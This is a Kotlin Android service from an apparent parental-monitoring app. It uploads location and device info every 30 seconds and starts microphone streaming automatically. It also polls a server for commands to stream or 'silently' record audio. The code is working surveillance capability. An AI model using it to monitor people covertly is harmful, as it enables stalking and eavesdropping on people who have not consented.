package ru.example.parentwatch.service

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import kotlinx.coroutines.*
import ru.example.parentwatch.MainActivity
import ru.example.parentwatch.R
import ru.example.parentwatch.network.NetworkHelper
import ru.example.parentwatch.audio.AudioStreamRecorder
import ru.example.parentwatch.utils.DeviceInfoCollector
import ru.example.parentwatch.utils.RemoteLogger

/**
 * Foreground service for continuous location tracking and audio streaming
 */
class LocationService : Service() {

    companion object {
        private const val TAG = "LocationService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "location_tracking"
        private const val LOCATION_UPDATE_INTERVAL = 30000L // 30 seconds
        private const val LOCATION_FASTEST_INTERVAL = 15000L // 15 seconds
        private const val COMMAND_CHECK_INTERVAL = 5000L // 5 seconds - quick response for audio streaming

        const val ACTION_START = "start"
        const val ACTION_STOP = "stop"
        const val ACTION_EMERGENCY_STOP = "emergency_stop"
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private lateinit var networkHelper: NetworkHelper
    private lateinit var audioRecorder: AudioStreamRecorder
    private lateinit var prefs: SharedPreferences
    private lateinit var appUsageTracker: AppUsageTracker

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private var isTracking = false
    private var isStreamingAudio = false
    private var deviceId: String? = null
    private var serverUrl: String? = null
    private var commandCheckJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        android.util.Log.d("ParentWatch", "LocationService onCreate called")
        Log.d(TAG, "Service created")

        prefs = getSharedPreferences("parentwatch_prefs", MODE_PRIVATE)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        networkHelper = NetworkHelper(this)
        audioRecorder = AudioStreamRecorder(this, networkHelper)
        appUsageTracker = AppUsageTracker(this)

        createNotificationChannel()
        setupLocationCallback()
        android.util.Log.d("ParentWatch", "LocationService onCreate completed")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("ParentWatch", "onStartCommand: ${intent?.action}")
        Log.d(TAG, "onStartCommand: ${intent?.action}")

        when (intent?.action) {
            ACTION_START -> startTracking()
            ACTION_STOP -> stopTracking()
            ACTION_EMERGENCY_STOP -> emergencyStopAll()
            null -> {
                // Service restarted by system, resume tracking if it was running
                Log.d(TAG, "Service restarted by system, resuming tracking")
                if (!isTracking) {
                    startTracking()
                }
            }
        }

        return START_STICKY
    }

    private fun startTracking() {
        if (isTracking) {
            Log.d(TAG, "Already tracking")
            return
        }

        // Start foreground service FIRST to avoid crash
        startForeground(NOTIFICATION_ID, createNotification())

        // Load settings
        deviceId = prefs.getString("device_id", null)
        serverUrl = prefs.getString("server_url", MainActivity.DEFAULT_SERVER_URL)

        if (deviceId == null) {
            Log.e(TAG, "Device ID not set")
            stopSelf()
            return
        }

        // Register device
        serviceScope.launch {
            try {
                val registered = networkHelper.registerDevice(serverUrl!!, deviceId!!)
                if (registered) {
                    Log.d(TAG, "Device registered")
                    startLocationUpdates()
                } else {
                    Log.e(TAG, "Failed to register device")
                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@LocationService, "Ошибка регистрации устройства", Toast.LENGTH_LONG).show()
                        stopSelf()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Registration error", e)
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@LocationService, "Ошибка подключения к серверу", Toast.LENGTH_LONG).show()
                    stopSelf()
                }
            }
        }

        isTracking = true
        prefs.edit().putBoolean("service_running", true).apply()

        // AUTO-START AUDIO STREAMING - Simplified architecture
        // Start audio streaming automatically when service starts
        serviceScope.launch {
            delay(5000) // Wait 5 seconds for WebSocket to connect and stabilize
            startAudioStreaming(recording = false)
            Log.d(TAG, "🎙️ Auto-started audio streaming (simplified architecture)")
        }
    }

    private fun stopTracking() {
        if (!isTracking) return

        fusedLocationClient.removeLocationUpdates(locationCallback)
        stopForeground(true)
        stopSelf()

        isTracking = false
        prefs.edit().putBoolean("service_running", false).apply()

        Log.d(TAG, "Tracking stopped")
    }

    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    handleLocationUpdate(location)
                }
            }
        }
    }

    private fun startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "Location permission not granted")
            stopSelf()
            return
        }

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            LOCATION_UPDATE_INTERVAL
        )
            .setMinUpdateIntervalMillis(LOCATION_FASTEST_INTERVAL)
            .build()

        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )

        // Start command checking
        startCommandChecking()

        Log.d(TAG, "Location updates started")
    }

    private fun handleLocationUpdate(location: Location) {
        Log.d(TAG, "Location update: ${location.latitude}, ${location.longitude}")

        // Upload to server with device info
        serviceScope.launch {
            // Collect device info
            val deviceInfo = DeviceInfoCollector.getDeviceInfo(this@LocationService)

            val success = networkHelper.uploadLocationWithDeviceInfo(
                serverUrl!!,
                location.latitude,
                location.longitude,
                location.accuracy,
                deviceInfo
            )

            if (success) {
                val batteryStatus = DeviceInfoCollector.getBatteryStatus(this@LocationService)
                updateNotification("Активно • $batteryStatus")
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = getString(R.string.notification_channel_description)
                setSound(null, null)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(contentText: String = "Отслеживание активно"): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(contentText)
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun updateNotification(text: String) {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, createNotification(text))
    }

    /**
     * Start periodic command checking
     */
    private fun startCommandChecking() {
        commandCheckJob?.cancel()
        commandCheckJob = serviceScope.launch {
            while (isTracking) {
                try {
                    checkStreamingCommands()
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking commands", e)
                }
                delay(COMMAND_CHECK_INTERVAL)
            }
        }
    }

    /**
     * Check for streaming commands from server
     */
    private suspend fun checkStreamingCommands() {
        val deviceId = this.deviceId
        val serverUrl = this.serverUrl

        if (deviceId.isNullOrBlank() || serverUrl.isNullOrBlank()) {
            RemoteLogger.error(
                serverUrl = serverUrl,
                deviceId = deviceId,
                source = TAG,
                message = "Skipping command check due to missing identifiers"
            )
            return
        }

        Log.d(TAG, "Checking commands for device $deviceId at $serverUrl")
        val commands = networkHelper.getStreamingCommands(serverUrl, deviceId)
        Log.d(TAG, "Received ${'$'}{commands.size} commands from server")
        RemoteLogger.info(
            serverUrl = serverUrl,
            deviceId = deviceId,
            source = TAG,
            message = "Fetched streaming commands",
            meta = mapOf("count" to commands.size)
        )

        for (command in commands) {
            Log.d(TAG, "Processing command: ${'$'}{command.type}")
            RemoteLogger.info(
                serverUrl = serverUrl,
                deviceId = deviceId,
                source = TAG,
                message = "Processing command",
                meta = mapOf(
                    "type" to command.type,
                    "timestamp" to command.timestamp
                )
            )

            when (command.type) {
                "start_audio_stream" -> {
                    startAudioStreaming(recording = false)
                }
                "stop_audio_stream" -> {
                    stopAudioStreaming()
                }
                "start_recording" -> {
                    audioRecorder.setRecordingMode(true)
                    Log.d(TAG, "Recording mode enabled (silent)")
                }
                "stop_recording" -> {
                    audioRecorder.setRecordingMode(false)
                    Log.d(TAG, "Recording mode disabled (silent)")
                }
            }
        }
    }

    /**
     * Start audio streaming
     */
    /**
     * Start audio streaming
     */
    private fun startAudioStreaming(recording: Boolean) {
        if (isStreamingAudio) {
            Log.w(TAG, "Already streaming audio")
            RemoteLogger.warn(
                serverUrl = serverUrl,
                deviceId = deviceId,
                source = TAG,
                message = "startAudioStreaming called while already active"
            )
            return
        }

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "Audio permission not granted - streaming cannot start")
            RemoteLogger.error(
                serverUrl = serverUrl,
                deviceId = deviceId,
                source = TAG,
                message = "Audio permission not granted - streaming cannot start"
            )
            return
        }

        val deviceId = this.deviceId ?: run {
            RemoteLogger.warn(
                serverUrl = serverUrl,
                deviceId = null,
                source = TAG,
                message = "Device ID missing - cannot start streaming"
            )
            return
        }
        val serverUrl = this.serverUrl ?: run {
            RemoteLogger.warn(
                serverUrl = null,
                deviceId = deviceId,
                source = TAG,
                message = "Server URL missing - cannot start streaming"
            )
            return
        }

        audioRecorder.startStreaming(deviceId, serverUrl, recording)
        isStreamingAudio = true

        Log.d(TAG, "Audio streaming started (silent mode)")
        RemoteLogger.info(
            serverUrl = serverUrl,
            deviceId = deviceId,
            source = TAG,
            message = "Audio streaming started from LocationService",
            meta = mapOf("recording" to recording)
        )
    }

    /**
     * Stop audio streaming
     */
    private fun stopAudioStreaming() {
        if (!isStreamingAudio) {
            return
        }

        val deviceId = this.deviceId
        val serverUrl = this.serverUrl

        audioRecorder.stopStreaming()
        isStreamingAudio = false

        Log.d(TAG, "Audio streaming stopped (silent mode)")
        RemoteLogger.info(
            serverUrl = serverUrl,
            deviceId = deviceId,
            source = TAG,
            message = "Audio streaming stopped from LocationService"
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    /**
     * Emergency stop - stops ALL functions immediately
     * Used when user wants to ensure everything is stopped (audio streaming, location tracking, etc.)
     */
    private fun emergencyStopAll() {
        Log.w(TAG, "🚨 EMERGENCY STOP - Stopping all functions")

        // Stop audio streaming immediately
        if (isStreamingAudio) {
            stopAudioStreaming()
            Log.d(TAG, "✅ Audio streaming stopped")
        }

        // Stop location tracking
        stopTracking()
        Log.d(TAG, "✅ Location tracking stopped")

        // Cancel all coroutines
        commandCheckJob?.cancel()
        Log.d(TAG, "✅ Command checking stopped")

        // Show notification
        Toast.makeText(this, "🚨 Экстренная остановка - все функции выключены", Toast.LENGTH_LONG).show()

        Log.w(TAG, "🚨 EMERGENCY STOP COMPLETED")
    }

    override fun onDestroy() {
        super.onDestroy()
        commandCheckJob?.cancel()
        if (isStreamingAudio) {
            stopAudioStreaming()
        }
        fusedLocationClient.removeLocationUpdates(locationCallback)
        serviceScope.cancel()
        Log.d(TAG, "Service destroyed")
    }
}
